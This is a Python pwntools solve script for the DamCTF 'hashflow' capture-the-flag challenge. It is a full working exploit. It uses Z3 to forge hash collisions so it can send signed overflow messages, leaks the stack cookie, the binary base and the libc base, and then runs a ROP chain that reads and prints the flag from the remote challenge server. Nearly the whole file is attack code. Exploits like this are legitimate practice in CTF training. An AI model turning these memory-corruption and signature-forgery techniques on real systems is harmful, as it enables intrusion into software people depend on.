#!/usr/bin/env python3

"""
Run exploit locally with:
./solve.py

Run against remote with:
./solve.py REMOTE HOST=chals.damctf.xyz PORT=31655
"""

import itertools

from pwn import *
from z3 import *

PROG_PATH = "./hashflow"


def init_pwntools_context():
    context.binary = PROG_PATH
    context.log_level = "debug"


def init_challenge_context():
    if args["REMOTE"]:
        io = remote(args["HOST"], int(args["PORT"]))
        libc = ELF("./libc.so.6", checksec=False)
    else:
        pty = process.PTY
        io = process(PROG_PATH, stdin=pty, stdout=pty, stderr=pty)
        libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)

    return io, libc


def H(input_bv):
    p = BitVecVal(18446744073709551557, 64)
    h = BitVecVal(0, 64)
    a = BitVecVal(1, 64)

    len_mod_8 = len(input_bv) % 8
    if len_mod_8:
        padding = 8 - len_mod_8 
        input_bv = input_bv + [BitVecVal(0, 8) for _ in range(padding)]

    for i in range(0, len(input_bv), 8):
        x = Concat(*reversed(input_bv[i:i+8]))
        h = h + a*x
        a = a*p

    return h


def bv_to_bytes(model, bv_list):
    return bytes([model[bv].as_long() for bv in bv_list])


def sig_for_data(io, data, prefix_size=0, suffix_size=0):
    collider_bv = [BitVec(f"collider_{i}", 8) for i in range(0o100)]

    prefix_bv = [BitVec(f"prefix_{i}", 8) for i in range(prefix_size)]
    data_bv = [BitVecVal(i, 8) for i in data]
    suffix_bv = [BitVec(f"suffix_{i}", 8) for i in range(suffix_size)]

    s = Solver()
    for bv in itertools.chain(prefix_bv, suffix_bv):
        s.add(bv != 0)

    s.add(H(collider_bv) == H(prefix_bv + data_bv + suffix_bv))
    if s.check() != sat:
        log.error("Cannot produce collision")

    model = s.model()

    collider_bytes = bv_to_bytes(model, collider_bv)

    collided_bytes = b""
    collided_bytes += bv_to_bytes(model, prefix_bv)
    collided_bytes += data
    collided_bytes += bv_to_bytes(model, suffix_bv)

    io.sendlineafter("Pick an option: ", "0")
    io.sendafter("Message: ", collider_bytes)

    io.recvuntil("Signature: ")
    signature = io.recvuntil("\n", drop=True).decode()

    return signature, collided_bytes


class Offsets:
    if args["REMOTE"]:
        pie_leak_stack = 0x20
    else:
        pie_leak_stack = 0x18

    pie_leak_binary_base = 0x10a0
    
    key_global = 0x202040


class Gadgets:
    # pop rsi; pop r15; ret;
    bin_pop_rsi_pop_r15 = 0xe0b

    # pop rdi; ret;
    bin_pop_rdi = 0xe0d

    if args["REMOTE"]:
        # pop rdx; ret;
        libc_pop_rdx = 0x1b96

        # pop rsi; ret;
        libc_pop_rsi = 0x23e8a
    else:
        # pop rdx; pop rbx; ret;
        libc_pop_rdx_pop_rbx = 0x162866

        # pop rsi; ret;
        libc_pop_rsi = 0x27529


def win(io, libc):
    elf = context.binary

    # Leak stack cookie. We write 9 bytes to overflow the null byte always
    # placed at the end of the cookie. We have to shift over our leak later
    # below to account for this.
    cookie_leak_data = b"B" * 9
    cookie_leak_sig, cookie_leak_bytes = sig_for_data(
        io, cookie_leak_data, prefix_size=0o100
    )
    log.info("Attempting forged message with signature: %s" % cookie_leak_sig)

    io.sendlineafter("Pick an option: ", "1")
    io.sendafter("Message: ", cookie_leak_bytes)
    io.sendlineafter("Signature: ", cookie_leak_sig)

    io.recvuntil(cookie_leak_data)
    raw_cookie_leak = io.recvuntil("\nPick", drop=True)
    io.unrecv("Pick")
    cookie_leak = u64(raw_cookie_leak.ljust(8, b"\x00"))
    cookie_leak <<= 8
    log.info("Leaked stack cookie %#x" % cookie_leak)

    # Leak an address from the binary.
    pie_leak_data = b"A" * Offsets.pie_leak_stack
    pie_leak_sig, pie_leak_bytes = sig_for_data(
        io, pie_leak_data, prefix_size=0o100
    )
    log.info("Attempting forged message with signature: %s" % pie_leak_sig)

    io.sendlineafter("Pick an option: ", "1")
    io.sendafter("Message: ", pie_leak_bytes)
    io.sendlineafter("Signature: ", pie_leak_sig)

    io.recvuntil(pie_leak_data)
    raw_pie_leak = io.recvuntil("\nPick", drop=True)
    io.unrecv("Pick")
    pie_leak = u64(raw_pie_leak.ljust(8, b"\x00"))

    log.info("Leaked address from the binary %#x" % pie_leak)
    elf.address = pie_leak - Offsets.pie_leak_binary_base
    log.info("Leaked binary base address %#x" % elf.address)

    def bin_gadget(addr):
        return p64(addr + elf.address)

    def libc_gadget(addr):
        return p64(addr + libc.address)

    # Next, leak a libc address and return back to menu.
    rop = b""
    rop += b"C" * 8
    rop += p64(cookie_leak)
    rop += b"D" * 8 * 7
    rop += bin_gadget(Gadgets.bin_pop_rdi)
    rop += p64(elf.got.puts)
    rop += p64(elf.plt.puts)
    rop += p64(elf.sym.menu)

    rop_sig, rop_bytes = sig_for_data(io, rop, prefix_size=0o100)
    log.info("Attempting forged message with signature: %s" % rop_sig)

    io.sendlineafter("Pick an option: ", "1")
    io.sendafter("Message: ", rop_bytes)
    io.sendlineafter("Signature: ", rop_sig)

    io.sendlineafter("Pick an option: ", "3")

    raw_libc_leak = io.recvuntil("\n0: ", drop=True)
    libc_leak = u64(raw_libc_leak.ljust(8, b"\x00"))

    log.info("Leaked puts@libc address %#x" % libc_leak)
    libc.address = libc_leak - libc.sym.puts
    log.info("Leaked libc base address %#x" % libc.address)

    # Finally, we can put together a flag-printing rop chain.
    rop = b""
    rop += b"C" * 8
    rop += p64(cookie_leak)
    rop += b"D" * 8 * 7

    # Read the flag from fd 3 into the key global buffer.
    rop += bin_gadget(Gadgets.bin_pop_rdi)
    rop += p64(3)
    rop += libc_gadget(Gadgets.libc_pop_rsi)
    rop += p64(elf.sym.key)
    if args["REMOTE"]:
        rop += libc_gadget(Gadgets.libc_pop_rdx)
        rop += p64(0x30)
    else:
        rop += libc_gadget(Gadgets.libc_pop_rdx_pop_rbx)
        rop += p64(0x30)
        rop += b"E" * 8
    rop += p64(elf.plt.read)

    # Print the flag from the key global buffer.
    rop += bin_gadget(Gadgets.bin_pop_rdi)
    rop += p64(elf.sym.key)
    rop += p64(elf.plt.puts)

    rop_sig, rop_bytes = sig_for_data(io, rop, prefix_size=0o100)
    log.info("Attempting forged message with signature: %s" % rop_sig)

    io.sendlineafter("Pick an option: ", "1")
    io.sendafter("Message: ", rop_bytes)
    io.sendlineafter("Signature: ", rop_sig)

    io.sendlineafter("Pick an option: ", "3")

    # Hopefully the flag gets sent...
    io.interactive()


if __name__ == "__main__":
    init_pwntools_context()
    io, libc = init_challenge_context()

    if args["PAUSE"]:
        raw_input("PAUSED...")

    win(io, libc)
